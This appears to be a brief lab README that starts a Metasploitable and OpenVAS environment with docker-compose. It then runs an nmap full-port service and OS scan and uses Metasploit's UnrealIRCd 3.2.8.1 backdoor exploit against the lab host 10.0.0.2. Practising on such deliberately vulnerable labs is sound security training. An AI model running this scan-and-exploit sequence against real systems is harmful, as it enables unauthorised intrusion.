### metasploitable and open-vas

docker-compose up

### nmap 

nmap -p0-65535 -sV -O 10.0.0.2

### metasploit 

msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf > show options
msf > set RHOST 10.0.0.2
msf > exploit
